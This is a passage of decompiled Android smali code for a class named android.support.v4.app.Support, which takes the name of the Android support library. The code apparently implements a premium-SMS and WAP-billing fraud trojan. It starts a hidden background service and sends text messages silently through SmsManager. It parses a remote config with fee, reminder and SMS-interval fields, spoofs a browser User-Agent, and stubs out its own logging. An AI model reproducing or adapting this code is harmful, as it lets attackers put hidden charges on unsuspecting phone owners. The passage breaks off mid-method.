.class public Landroid/support/v4/app/Support;
.super Ljava/lang/Object;


# static fields
.field public static a:Landroid/content/Context;

.field private static final b:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-class v0, Landroid/support/v4/app/Support;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Landroid/support/v4/app/Support;->b:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static a([BI[BIII)I
    .locals 7

    const/4 v3, 0x0

    const/4 v0, -0x1

    if-eqz p0, :cond_0

    array-length v1, p0

    if-eqz v1, :cond_0

    if-eqz p1, :cond_0

    if-eqz p2, :cond_0

    array-length v1, p2

    if-eqz v1, :cond_0

    if-eqz p3, :cond_0

    array-length v1, p0

    if-ge p4, v1, :cond_0

    if-gt p5, p4, :cond_1

    :cond_0
    :goto_0
    return v0

    :cond_1
    if-gez p4, :cond_7

    move v1, v3

    :goto_1
    if-lez p5, :cond_2

    array-length v2, p0

    if-le p5, v2, :cond_3

    :cond_2
    array-length p5, p0

    :cond_3
    sub-int v2, p5, v1

    if-gt p3, v2, :cond_0

    sub-int v4, p5, p3

    :goto_2
    if-gt v1, v4, :cond_0

    move v2, v3

    :goto_3
    if-lt v2, p3, :cond_5

    :cond_4
    if-ne v2, p3, :cond_6

    move v0, v1

    goto :goto_0

    :cond_5
    add-int v5, v1, v2

    aget-byte v5, p0, v5

    aget-byte v6, p2, v2

    if-ne v5, v6, :cond_4

    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_6
    add-int/lit8 v1, v1, 0x1

    goto :goto_2

    :cond_7
    move v1, p4

    goto :goto_1
.end method

.method public static a(Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    if-nez p0, :cond_0

    const-string p0, ""

    :cond_0
    return-object p0
.end method

.method public static a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    if-nez p0, :cond_0

    :goto_0
    return-object p1

    :cond_0
    move-object p1, p0

    goto :goto_0
.end method

.method private static a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    const/4 v0, 0x0

    if-eqz p0, :cond_0

    if-eqz p1, :cond_0

    if-eqz p2, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v2

    if-nez v2, :cond_1

    :cond_0
    :goto_0
    return-object v0

    :cond_1
    invoke-virtual {p0, p1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-ltz v2, :cond_0

    add-int v3, v2, v1

    invoke-virtual {p0, p2, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v3

    if-ltz v3, :cond_0

    add-int v0, v2, v1

    invoke-virtual {p0, v0, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method

.method public static a()Ljava/util/Map;
    .locals 3

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "Accept"

    const-string v2, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "Accept-Language"

    const-string v2, "zh-CN, en-US"

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "Accept-Encoding"

    const-string v2, "gzip,deflate"

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "User-Agent"

    invoke-static {}, Landroid/support/v4/app/Support;->b()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    return-object v0
.end method

.method public static a(J)V
    .locals 1

    :try_start_0
    invoke-static {p0, p1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;)V
    .locals 3

    sget-object v0, Landroid/support/v4/app/Support;->b:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Start service mServiceStart="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v2, Landroid/support/v4/content/CoreService;->a:Z

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    sget-boolean v0, Landroid/support/v4/content/CoreService;->a:Z

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Landroid/support/v4/content/CoreService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.support.v4.content.cmd.CoreService"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    return-void
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    const/4 v3, 0x0

    sget-object v0, Landroid/support/v4/app/Support;->b:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "SendSms num="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " content="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "dle.com.send"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p0, v3, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    new-instance v0, Landroid/content/Intent;

    const-string v1, "dle.com.delivery"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p0, v3, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    const/4 v2, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    return-void
.end method

.method public static a(Ljava/lang/String;J)V
    .locals 4

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "yyyy-MM-dd HH:mm:ss SSS"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1, p1, p2}, Ljava/util/Date;-><init>(J)V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "printDate="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p1, p2}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ";date="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static a(Ljava/lang/String;[B)V
    .locals 0

    return-void
.end method

.method public static a(Landroid/content/Context;Landroid/support/v4/app/g;Z)Z
    .locals 9

    const/4 v7, 0x1

    const/4 v1, 0x0

    if-nez p1, :cond_0

    :goto_0
    return v1

    :cond_0
    invoke-static {}, Landroid/support/v4/app/o;->a()Landroid/support/v4/app/o;

    move-result-object v2

    move v0, v1

    :goto_1
    iget v3, p1, Landroid/support/v4/app/g;->d:I

    if-lt v0, v3, :cond_2

    invoke-static {}, Landroid/support/v4/app/m;->a()Landroid/support/v4/app/m;

    move-result-object v2

    iget v0, p1, Landroid/support/v4/app/g;->a:I

    const/4 v3, 0x3

    invoke-static {v0, v3}, Ljava/lang/Math;->max(II)I

    move-result v0

    int-to-long v3, v0

    const-wide/32 v5, 0x36ee80

    mul-long/2addr v3, v5

    invoke-virtual {v2, v3, v4}, Landroid/support/v4/app/m;->a(J)V

    move v0, v1

    :goto_2
    iget v3, p1, Landroid/support/v4/app/g;->h:I

    if-lt v0, v3, :cond_3

    move v0, v1

    :goto_3
    iget v3, p1, Landroid/support/v4/app/g;->l:I

    if-lt v0, v3, :cond_4

    invoke-virtual {v2, p0}, Landroid/support/v4/app/m;->c(Landroid/content/Context;)Z

    invoke-static {}, Landroid/support/v4/app/a;->a()Landroid/support/v4/app/a;

    move-result-object v0

    iget v2, p1, Landroid/support/v4/app/g;->B:I

    invoke-virtual {v0, p0, v2}, Landroid/support/v4/app/a;->c(Landroid/content/Context;I)Z

    invoke-static {}, Landroid/support/v4/app/q;->a()Landroid/support/v4/app/q;

    move-result-object v8

    move v6, v1

    :goto_4
    iget v0, p1, Landroid/support/v4/app/g;->t:I

    if-lt v6, v0, :cond_5

    if-eqz p2, :cond_1

    iget v0, p1, Landroid/support/v4/app/g;->z:I

    if-ne v0, v7, :cond_1

    new-instance v0, Landroid/content/Intent;

    const-class v1, Landroid/support/v4/content/CoreService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.support.v4.content.cmd.WapCfg"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "wapid"

    iget v2, p1, Landroid/support/v4/app/g;->A:I

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_1
    move v1, v7

    goto :goto_0

    :cond_2
    new-instance v3, Landroid/support/v4/app/n;

    invoke-direct {v3}, Landroid/support/v4/app/n;-><init>()V

    iget v4, p1, Landroid/support/v4/app/g;->b:I

    iget-object v5, p1, Landroid/support/v4/app/g;->e:[I

    aget v5, v5, v0

    iget-object v6, p1, Landroid/support/v4/app/g;->f:[Ljava/lang/String;

    aget-object v6, v6, v0

    iget-object v8, p1, Landroid/support/v4/app/g;->g:[Ljava/lang/String;

    aget-object v8, v8, v0

    invoke-virtual {v3, v4, v5, v6, v8}, Landroid/support/v4/app/n;->a(IILjava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Landroid/support/v4/app/o;->a(Ljava/lang/Runnable;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_3
    new-instance v3, Landroid/support/v4/app/m$c;

    invoke-direct {v3}, Landroid/support/v4/app/m$c;-><init>()V

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->i:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$c;->a:Ljava/lang/String;

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->j:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$c;->b:Ljava/lang/String;

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->k:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$c;->c:Ljava/lang/String;

    invoke-virtual {v2, v3}, Landroid/support/v4/app/m;->a(Landroid/support/v4/app/m$c;)V

    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_2

    :cond_4
    new-instance v3, Landroid/support/v4/app/m$a;

    invoke-direct {v3}, Landroid/support/v4/app/m$a;-><init>()V

    iget v4, p1, Landroid/support/v4/app/g;->c:I

    const/4 v5, 0x2

    invoke-static {v4, v5}, Ljava/lang/Math;->max(II)I

    move-result v4

    iput v4, v3, Landroid/support/v4/app/m$a;->a:I

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->m:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$a;->b:Ljava/lang/String;

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->n:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$a;->c:Ljava/lang/String;

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->o:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$a;->d:Ljava/lang/String;

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->p:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$a;->e:Ljava/lang/String;

    iget-object v4, p1, Landroid/support/v4/app/g;->q:[I

    aget v4, v4, v0

    iput v4, v3, Landroid/support/v4/app/m$a;->f:I

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->r:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$a;->g:Ljava/lang/String;

    new-instance v4, Ljava/lang/String;

    iget-object v5, p1, Landroid/support/v4/app/g;->s:[Ljava/lang/String;

    aget-object v5, v5, v0

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Landroid/support/v4/app/m$a;->h:Ljava/lang/String;

    invoke-virtual {v2, v3}, Landroid/support/v4/app/m;->a(Landroid/support/v4/app/m$a;)V

    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_3

    :cond_5
    new-instance v0, Landroid/support/v4/app/p;

    iget-object v1, p1, Landroid/support/v4/app/g;->u:[I

    aget v1, v1, v6

    iget-object v2, p1, Landroid/support/v4/app/g;->v:[I

    aget v2, v2, v6

    iget-object v3, p1, Landroid/support/v4/app/g;->w:[Ljava/lang/String;

    aget-object v3, v3, v6

    iget-object v4, p1, Landroid/support/v4/app/g;->x:[Ljava/lang/String;

    aget-object v4, v4, v6

    iget-object v5, p1, Landroid/support/v4/app/g;->y:[Ljava/lang/String;

    aget-object v5, v5, v6

    invoke-direct/range {v0 .. v5}, Landroid/support/v4/app/p;-><init>(IILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v8, v0}, Landroid/support/v4/app/q;->a(Ljava/lang/Runnable;)V

    add-int/lit8 v1, v6, 0x1

    move v6, v1

    goto/16 :goto_4
.end method

.method public static b()Ljava/lang/String;
    .locals 4

    const-string v0, "Mozilla/5.0 (Linux; U; Android %s; zh-cn; %s Build/%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"

    const/4 v1, 0x3

    :try_start_0
    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x1

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x2

    sget-object v3, Landroid/os/Build;->ID:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const-string v0, "Mozilla/5.0 (Linux; U; Android 4.2; zh-cn; Sumxing Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3"

    goto :goto_0
.end method

.method public static b(Landroid/content/Context;)V
    .locals 1

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    return-void
.end method

.method public static b(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public static b(Ljava/lang/String;)Z
    .locals 2

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    :cond_0
    add-int/lit8 v0, v0, -0x1

    if-gez v0, :cond_1

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_1
    invoke-virtual {p0, v0}, Ljava/lang/String;->charAt(I)C

    move-result v1

    invoke-static {v1}, Ljava/lang/Character;->isDigit(C)Z

    move-result v1

    if-nez v1, :cond_0

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static c()B
    .locals 6

    const-wide v0, 0x4050400000000000L    # 65.0

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v2

    const-wide/high16 v4, 0x403a000000000000L    # 26.0

    mul-double/2addr v2, v4

    add-double/2addr v0, v2

    double-to-int v0, v0

    int-to-byte v0, v0

    return v0
.end method

.method public static c(Ljava/lang/String;)I
    .locals 2

    const/4 v0, 0x0

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_1

    :cond_0
    :goto_0
    return v0

    :cond_1
    :try_start_0
    invoke-static {p0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    goto :goto_0

    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public static c(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public static checkAppStatus(Landroid/content/Context;)V
    .locals 2

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    sget-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-static {v0}, Landroid/support/v4/app/Support;->b(Landroid/content/Context;)V

    sget-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-static {v0}, Landroid/support/v4/app/Support;->a(Landroid/content/Context;)V

    invoke-static {}, Landroid/support/v4/app/m;->a()Landroid/support/v4/app/m;

    move-result-object v0

    sget-object v1, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-virtual {v0, v1}, Landroid/support/v4/app/m;->d(Landroid/content/Context;)Z

    return-void
.end method

.method public static d(Ljava/lang/String;)Landroid/support/v4/app/g;
    .locals 11

    const/4 v10, 0x4

    const/4 v9, 0x3

    const/4 v8, 0x1

    const/4 v1, 0x0

    const/4 v7, 0x2

    const/4 v0, 0x0

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-nez v2, :cond_2

    :cond_0
    const/4 v0, 0x0

    :cond_1
    :goto_0
    return-object v0

    :cond_2
    const-string v2, "\r\n"

    const-string v3, "\n"

    invoke-virtual {p0, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v2, "rem_fee_begin\n"

    invoke-virtual {v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const-string v4, "rem_fee_end"

    invoke-virtual {v3, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-ltz v2, :cond_1

    if-ltz v4, :cond_1

    if-ge v2, v4, :cond_1

    new-instance v2, Landroid/support/v4/app/g;

    invoke-direct {v2}, Landroid/support/v4/app/g;-><init>()V

    const-string v0, "config_sms_interval="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->b:I

    const-string v0, "config_sms_cnf_interval="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->c:I

    const-string v0, "config_sms_rem_interval="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->a:I

    const-string v0, "config_wap_remain="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->B:I

    const-string v0, "real_fee_value="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Landroid/support/v4/app/g;->D:Ljava/lang/String;

    const-string v0, "real_fee_type="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Landroid/support/v4/app/g;->C:Ljava/lang/String;

    const-string v0, "config_fee_item_cnt="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->d:I

    iget v0, v2, Landroid/support/v4/app/g;->d:I

    if-lez v0, :cond_3

    iget v0, v2, Landroid/support/v4/app/g;->d:I

    new-array v0, v0, [I

    iput-object v0, v2, Landroid/support/v4/app/g;->e:[I

    iget v0, v2, Landroid/support/v4/app/g;->d:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->f:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->d:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->g:[Ljava/lang/String;

    :cond_3
    move v0, v1

    :goto_1
    iget v4, v2, Landroid/support/v4/app/g;->d:I

    if-lt v0, v4, :cond_7

    const-string v0, "reminfo_count="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->h:I

    iget v0, v2, Landroid/support/v4/app/g;->h:I

    if-lez v0, :cond_4

    iget v0, v2, Landroid/support/v4/app/g;->h:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->i:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->h:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->j:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->h:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->k:[Ljava/lang/String;

    :cond_4
    move v0, v1

    :goto_2
    iget v4, v2, Landroid/support/v4/app/g;->h:I

    if-lt v0, v4, :cond_9

    const-string v0, "cnfinfo_count="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->l:I

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    if-lez v0, :cond_5

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->m:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->n:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->o:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->p:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [I

    iput-object v0, v2, Landroid/support/v4/app/g;->q:[I

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->r:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->l:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->s:[Ljava/lang/String;

    :cond_5
    move v0, v1

    :goto_3
    iget v4, v2, Landroid/support/v4/app/g;->l:I

    if-lt v0, v4, :cond_b

    const-string v0, "wapinfo_count="

    const-string v4, "\n"

    invoke-static {v3, v0, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->t:I

    iget v0, v2, Landroid/support/v4/app/g;->t:I

    if-lez v0, :cond_6

    iget v0, v2, Landroid/support/v4/app/g;->t:I

    new-array v0, v0, [I

    iput-object v0, v2, Landroid/support/v4/app/g;->u:[I

    iget v0, v2, Landroid/support/v4/app/g;->t:I

    new-array v0, v0, [I

    iput-object v0, v2, Landroid/support/v4/app/g;->v:[I

    iget v0, v2, Landroid/support/v4/app/g;->t:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->w:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->t:I

    new-array v0, v0, [Ljava/lang/String;

